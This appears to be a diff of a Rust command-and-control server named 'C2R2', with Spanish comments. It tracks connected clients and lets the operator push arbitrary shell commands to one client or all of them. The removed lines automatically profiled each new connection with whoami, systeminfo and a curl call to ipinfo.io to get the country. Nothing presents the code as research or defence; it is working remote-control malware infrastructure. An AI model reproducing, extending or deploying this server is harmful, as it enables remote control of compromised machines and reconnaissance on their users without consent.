@@ -1,8 +1,6 @@
 use tokio::net::{TcpListener, TcpStream};
-use tokio::io::{AsyncReadExt, AsyncWriteExt};
+use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
 use tokio::sync::mpsc;
-use tokio::process::Command;
-use tokio::time::{sleep, Duration};
 use std::collections::HashMap;
 use std::sync::{Arc, Mutex};
 use std::sync::atomic::{AtomicU64, Ordering};
@@ -11,17 +9,19 @@ use clap::Parser;
 
 type ClientId = u64;
 
+const DELIMITER: &str = "\n<<END>>\n";
+
 #[derive(Parser)]
 #[command(name = "c2r2-server")]
 #[command(about = "C2R2 Command & Control Server", long_about = None)]
 struct Args {
-    /// Puerto donde escuchar conexiones
-    #[arg(short, long, default_value_t = 4444)]
-    port: u16,
-    
     /// Dirección IP donde bindear (0.0.0.0 para todas las interfaces)
     #[arg(short, long, default_value = "0.0.0.0")]
     bind: String,
+
+    /// Puerto donde escuchar conexiones
+    #[arg(short, long, default_value_t = 4444)]
+    port: u16,
     
     /// Modo verboso
     #[arg(short, long)]
@@ -30,284 +30,242 @@ struct Args {
 
 // Estructura para manejar cada cliente
 struct ClientHandle {
+    id: ClientId,
     addr: String,
-    tx: mpsc::Sender<String>,
-    username: Option<String>,
-    os_info: Option<String>,
-    country: Option<String>,
+    tx: mpsc::UnboundedSender<String>,
 }
-
-// Variable global para selección de cliente
-static SELECTED_CLIENT: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
 
 // Maneja la comunicación con un cliente
-async fn handle_client(mut socket: tokio::net::tcp::OwnedReadHalf, id: ClientId, clients: Arc<Mutex<HashMap<ClientId, ClientHandle>>>, verbose: bool) {
-    let mut buf = vec![0u8; 4096]; // Buffer más grande para respuestas
+async fn handle_client(
+    id: ClientId,
+    mut stream: TcpStream,
+    clients: Arc<Mutex<HashMap<ClientId, ClientHandle>>>,
+) {
+    let addr = stream.peer_addr().unwrap().to_string();
+    println!("🔗 Nuevo cliente [{}] desde {}", id, addr);
 
-    loop {
-        match socket.read(&mut buf).await {
-            Ok(0) => {
-                println!("🔌 Cliente [{}] desconectado", id);
-                clients.lock().unwrap().remove(&id);
-                return;
-            }
-            Ok(n) => {
-                let data = &buf[..n];
-                let response = String::from_utf8_lossy(data).trim().to_string();
-                
-                // Mostrar la respuesta del agente
-                println!("📨 [{}] Respuesta:", id);
-                println!("{}", response);
-                println!(); // Línea en blanco para separar
-                
-                if verbose {
-                    println!("🔍 [DEBUG] Bytes recibidos: {}", n);
-                }
-                
-                // Actualizar información del cliente si es necesario
-                update_client_info(id, &response, &clients).await;
-            }
-            Err(e) => {
-                eprintln!("⚠️ Error en cliente {}: {:?}", id, e);
-                clients.lock().unwrap().remove(&id);
-                return;
-            }
-        }
+    let (tx, mut rx) = mpsc::unbounded_channel::<String>();
+    
+    {
+        let mut clients = clients.lock().unwrap();
+        clients.insert(id, ClientHandle {
+            id,
+            addr: addr.clone(),
+            tx,
+        });
     }
-}
 
-// Función para actualizar información del cliente basada en las respuestas
-async fn update_client_info(id: ClientId, response: &str, clients: &Arc<Mutex<HashMap<ClientId, ClientHandle>>>) {
-    let mut map = clients.lock().unwrap();
-    if let Some(client) = map.get_mut(&id) {
-        // Detectar respuesta de whoami
-        if response.contains("\\") && client.username.is_none() {
-            client.username = Some(response.split('\\').last().unwrap_or("Desconocido").to_string());
+    let (reader, mut writer) = stream.split();
+    let mut reader = BufReader::new(reader);
+
+    // Tarea para enviar comandos al cliente
+    let send_task = tokio::spawn(async move {
+        while let Some(cmd) = rx.recv().await {
+            let message = format!("{}\n", cmd);
+            if let Err(e) = writer.write_all(message.as_bytes()).await {
+                eprintln!("❌ Error enviando a cliente: {}", e);
+                break;
+            }
+            if let Err(e) = writer.flush().await {
+                eprintln!("❌ Error en flush: {}", e);
+                break;
+            }
         }
+    });
+
+    // Tarea para recibir respuestas del cliente
+    let recv_task = tokio::spawn(async move {
+        let mut buffer = String::new();
         
-        // Detectar respuesta de información del OS
-        if response.contains("OS Name") && client.os_info.is_none() {
-            // Extraer nombre del producto de Windows
-            if let Some(product_line) = response.lines().find(|line| line.contains("OS Name")) {
-                if let Some(product_name) = product_line.split(':').nth(1) {
-                    client.os_info = Some(product_name.trim().to_string());
-                }
-            }
-        }
-        
-        // Detectar respuesta del país
-        if response.len() == 2 && response.chars().all(|c| c.is_alphabetic()) && client.country.is_none() {
-            client.country = Some(response.to_uppercase());
-        }
-    }
-}
-
-fn handle_command(cmd: &str, clients: &Arc<Mutex<HashMap<ClientId, ClientHandle>>>) {
-    let parts: Vec<&str> = cmd.trim().split_whitespace().collect();
-    if parts.is_empty() {
-        return;
-    }
-
-    match parts[0] {
-        "/list" => {
-            let map = clients.lock().unwrap();
-            println!("📋 Clientes conectados:");
-            if map.is_empty() {
-                println!("  No hay clientes conectados");
-            } else {
-                // Header de la tabla
-                println!("{:<5} {:<18} {:<15} {:<25} {:<10}", "ID", "Dirección", "Usuario", "Sistema Operativo", "País");
-                println!("{}", "-".repeat(73));
-                
-                for (id, h) in map.iter() {
-                    println!("{:<5} {:<18} {:<15} {:<25} {:<10}", 
-                        id,
-                        h.addr,
-                        h.username.as_deref().unwrap_or("Desconocido"),
-                        h.os_info.as_deref().unwrap_or("Desconocido"),
-                        h.country.as_deref().unwrap_or("Desconocido")
-                    );
-                }
-            }
-        }
-        "/cmd" => {
-            if parts.len() < 2 {
-                println!("❌ Uso: /cmd <comando>");
-                return;
-            }
-            let command = parts[1..].join(" ");
-            let selected_id = SELECTED_CLIENT.load(Ordering::Relaxed);
+        loop {
+            buffer.clear();
             
-            if selected_id == 0 {
-                println!("❌ No hay cliente seleccionado. Use /select <id> primero");
-                return;
+            // Leer hasta encontrar el delimitador
+            loop {
+                let mut line = String::new();
+                match reader.read_line(&mut line).await {
+                    Ok(0) => return,
+                    Ok(_) => {
+                        buffer.push_str(&line);
+                        if buffer.contains(DELIMITER) {
+                            break;
+                        }
+                    }
+                    Err(e) => {
+                        eprintln!("⚠️ Error leyendo de cliente {}: {}", id, e);
+                        return;
+                    }
+                }
             }
             
-            let map = clients.lock().unwrap();
-            if let Some(client_handle) = map.get(&selected_id) {
-                if let Err(e) = client_handle.tx.try_send(command.clone()) {
-                    eprintln!("⚠️ Error enviando a {}: {:?}", selected_id, e);
-                } else {
-                    println!("📤 Comando enviado a [{}]: {}", selected_id, command);
-                }
-            } else {
-                println!("❌ Cliente seleccionado {} ya no está conectado", selected_id);
-                SELECTED_CLIENT.store(0, Ordering::Relaxed);
+            // Remover delimitador y mostrar respuesta
+            let response = buffer.replace(DELIMITER, "").trim().to_string();
+            if !response.is_empty() {
+                println!("\n📨 Respuesta del cliente [{}]:\n{}\n", id, response);
+                print!("> ");
+                io::stdout().flush().unwrap();
             }
         }
-        "/cmd_all" => {
-            if parts.len() < 2 {
-                println!("❌ Uso: /cmd_all <comando>");
-                return;
-            }
-            let command = parts[1..].join(" ");
-            let map = clients.lock().unwrap();
-            if map.is_empty() {
-                println!("❌ No hay clientes conectados");
-                return;
-            }
-            for (id, h) in map.iter() {
-                if let Err(e) = h.tx.try_send(command.clone()) {
-                    eprintln!("⚠️ Error enviando a {}: {:?}", id, e);
-                } else {
-                    println!("📤 Comando enviado a [{}]: {}", id, command);
-                }
-            }
-        }
-        "/select" => {
-            if parts.len() < 2 {
-                println!("❌ Uso: /select <id>");
-                return;
-            }
-            let id: ClientId = match parts[1].parse() {
-                Ok(v) => v,
-                Err(_) => { 
-                    println!("❌ ID inválido"); 
-                    return; 
-                }
-            };
-            let map = clients.lock().unwrap();
-            if map.contains_key(&id) {
-                SELECTED_CLIENT.store(id, Ordering::Relaxed);
-                println!("✅ Cliente [{}] seleccionado", id);
-                println!("ℹ️ Ahora puedes usar /cmd <comando> para enviar comandos a este cliente");
-            } else {
-                println!("❌ Cliente {} no existe", id);
-            }
-        }
-        "/exit" | "/quit" => {
-            println!("👋 Cerrando servidor...");
-            std::process::exit(0);
-        }
-        "/help" => {
-            println!("📖 Comandos disponibles:");
-            println!("  /list                    -> lista clientes conectados");
-            println!("  /select <id>             -> selecciona un cliente por ID");
-            println!("  /cmd <comando>           -> envía comando al cliente seleccionado");
-            println!("  /cmd_all <comando>       -> envía comando a todos los clientes");
-            println!("  /exit, /quit             -> cierra el servidor");
-            println!("  /help                    -> muestra esta ayuda");
-        }
-        _ => println!("❓ Comando desconocido: {}. Use /help para ver comandos disponibles.", parts[0]),
+    });
+
+    // Esperar a que termine alguna tarea
+    tokio::select! {
+        _ = send_task => {},
+        _ = recv_task => {},
     }
+
+    // Limpiar cliente
+    clients.lock().unwrap().remove(&id);
+    println!("❌ Cliente [{}] desconectado", id);
 }
 
 #[tokio::main]
-async fn main() -> Result<(), Box<dyn std::error::Error>> {
+async fn main() {
     let args = Args::parse();
-    
-    let bind_addr = format!("{}:{}", args.bind, args.port);
-    let listener = TcpListener::bind(&bind_addr).await?;
-    
+
     println!("🚀 C2R2 Server v1.0");
-    println!("🔗 Escuchando en {}", bind_addr);
-    if args.verbose {
-        println!("🔍 Modo verboso activado");
-    }
+    println!("🔗 Escuchando en {}:{}", args.bind, args.port);
     println!("📝 Use /help para ver comandos disponibles");
     println!("{}", "-".repeat(50));
 
+    let listener = TcpListener::bind(format!("{}:{}", args.bind, args.port))
+        .await
+        .expect("No se pudo iniciar el servidor");
+
     let clients: Arc<Mutex<HashMap<ClientId, ClientHandle>>> = Arc::new(Mutex::new(HashMap::new()));
-    let id_gen = AtomicU64::new(0);
+    let next_id = Arc::new(AtomicU64::new(1));
+    let selected_client: Arc<Mutex<Option<ClientId>>> = Arc::new(Mutex::new(None));
 
-    // Tarea para leer comandos desde la CLI
-    {
-        let clients_cli = Arc::clone(&clients);
-        std::thread::spawn(move || {
-            let stdin = io::stdin();
-            for line in stdin.lock().lines() {
-                if let Ok(cmd) = line {
-                    handle_command(&cmd, &clients_cli);
+    // Tarea para aceptar conexiones
+    let clients_clone = clients.clone();
+    let next_id_clone = next_id.clone();
+    tokio::spawn(async move {
+        loop {
+            match listener.accept().await {
+                Ok((stream, _)) => {
+                    let id = next_id_clone.fetch_add(1, Ordering::SeqCst);
+                    let clients = clients_clone.clone();
+                    tokio::spawn(handle_client(id, stream, clients));
+                }
+                Err(e) => {
+                    eprintln!("❌ Error aceptando conexión: {}", e);
                 }
             }
-        });
-    }
+        }
+    });
 
-    // Aceptar clientes
+    // Loop para comandos del usuario
+    let stdin = io::stdin();
+    let mut lines = stdin.lock().lines();
+
     loop {
-        let (socket, addr) = listener.accept().await?;
-        let id = id_gen.fetch_add(1, Ordering::Relaxed) + 1;
+        print!("> ");
+        io::stdout().flush().unwrap();
 
-        // Canal para enviar mensajes al cliente
-        let (tx, mut rx) = mpsc::channel::<String>(32);
-
-        println!("🔗 Nuevo cliente [{}] desde {}", id, addr);
-
-        // Crear handle temporal sin información adicional
-        let client_handle = ClientHandle {
-            addr: addr.to_string(),
-            tx: tx.clone(),
-            username: None,
-            os_info: None,
-            country: None,
-        };
-        
-        clients.lock().unwrap().insert(id, client_handle);
-
-        // Solicitar información del cliente
-        let info_tx = tx.clone();
-        tokio::spawn(async move {
-            // Esperar un momento para que el cliente se establezca
-            sleep(Duration::from_millis(1000)).await;
+        if let Some(Ok(line)) = lines.next() {
+            let parts: Vec<&str> = line.trim().split_whitespace().collect();
             
-            // Solicitar username
-            if let Err(e) = info_tx.send("whoami".to_string()).await {
-                eprintln!("⚠️ Error solicitando username a {}: {:?}", id, e);
-                return;
+            if parts.is_empty() {
+                continue;
             }
-            
-            sleep(Duration::from_millis(2000)).await;
-            
-            // Solicitar información del OS
-            if let Err(e) = info_tx.send("systeminfo | findstr /C:\"OS Name\"".to_string()).await {
-                eprintln!("⚠️ Error solicitando OS info a {}: {:?}", id, e);
-                return;
-            }
-            
-            sleep(Duration::from_millis(2000)).await;
-            
-            // Solicitar IP pública para determinar país
-            if let Err(e) = info_tx.send("curl -s ipinfo.io/country".to_string()).await {
-                eprintln!("⚠️ Error solicitando país a {}: {:?}", id, e);
-            }
-        });
 
-        // Split the socket into reader and writer halves
-        let (reader, mut writer) = socket.into_split();
-
-        // Tarea: escritor (consume rx y escribe al socket)
-        tokio::spawn(async move {
-            while let Some(msg) = rx.recv().await {
-                if let Err(e) = writer.write_all(msg.as_bytes()).await {
-                    eprintln!("⚠️ Error escribiendo a {}: {:?}", id, e);
-                    break;
+            match parts[0] {
+                "/help" => {
+                    println!("📖 Comandos disponibles:");
+                    println!("  /list                    -> lista clientes conectados");
+                    println!("  /select <id>             -> selecciona un cliente por ID");
+                    println!("  /cmd <comando>           -> envía comando al cliente seleccionado");
+                    println!("  /cmd_all <comando>       -> envía comando a todos los clientes");
+                    println!("  /exit, /quit             -> cierra el servidor");
+                    println!("  /help                    -> muestra esta ayuda");
+                }
+                "/list" => {
+                    let clients = clients.lock().unwrap();
+                    if clients.is_empty() {
+                        println!("  No hay clientes conectados");
+                    } else {
+                        println!("📋 Clientes conectados:");
+                        println!("{:<5} {:<18}", "ID", "Dirección");
+                        println!("{}", "-".repeat(30));
+                        for (id, client) in clients.iter() {
+                            println!("{:<5} {:<18}", id, client.addr);
+                        }
+                    }
+                }
+                "/select" => {
+                    if parts.len() < 2 {
+                        println!("❌ Uso: /select <id>");
+                        continue;
+                    }
+                    
+                    if let Ok(id) = parts[1].parse::<ClientId>() {
+                        let clients = clients.lock().unwrap();
+                        if clients.contains_key(&id) {
+                            *selected_client.lock().unwrap() = Some(id);
+                            println!("✅ Cliente [{}] seleccionado", id);
+                            println!("ℹ️ Ahora puedes usar /cmd <comando> para enviar comandos a este cliente");
+                        } else {
+                            println!("❌ Cliente no encontrado");
+                        }
+                    } else {
+                        println!("❌ ID inválido");
+                    }
+                }
+                "/cmd" => {
+                    if parts.len() < 2 {
+                        println!("❌ Uso: /cmd <comando>");
+                        continue;
+                    }
+                    
+                    let selected = selected_client.lock().unwrap();
+                    if let Some(id) = *selected {
+                        let command = parts[1..].join(" ");
+                        let clients = clients.lock().unwrap();
+                        
+                        if let Some(client) = clients.get(&id) {
+                            if let Err(e) = client.tx.send(command.clone()) {
+                                println!("❌ Error enviando comando: {}", e);
+                            } else {
+                                println!("📤 Comando enviado a [{}]: {}", id, command);
+                            }
+                        } else {
+                            println!("❌ Cliente no encontrado");
+                            drop(selected); // Liberar el lock antes de modificar
+                            *selected_client.lock().unwrap() = None;
+                        }
+                    } else {
+                        println!("❌ No hay cliente seleccionado. Use /select <id> primero");
+                    }
+                }
+                "/cmd_all" => {
+                    if parts.len() < 2 {
+                        println!("❌ Uso: /cmd_all <comando>");
+                        continue;
+                    }
+                    
+                    let command = parts[1..].join(" ");
+                    let clients = clients.lock().unwrap();
+                    
+                    if clients.is_empty() {
+                        println!("❌ No hay clientes conectados");
+                    } else {
+                        for (id, client) in clients.iter() {
+                            if let Err(e) = client.tx.send(command.clone()) {
+                                println!("❌ Error enviando a [{}]: {}", id, e);
+                            } else {
+                                println!("📤 Comando enviado a [{}]: {}", id, command);
+                            }
+                        }
+                    }
+                }
+                "/exit" | "/quit" => {
+                    println!("👋 Cerrando servidor...");
+                    std::process::exit(0);
+                }
+                _ => {
+                    println!("❌ Comando desconocido. Use /help");
                 }
             }
-        });
-
-        // Tarea: lector (procesa las respuestas del cliente)
-        let clients_reader = Arc::clone(&clients);
-        let verbose = args.verbose;
-        tokio::spawn(handle_client(reader, id, clients_reader, verbose));
+        }
     }
 }
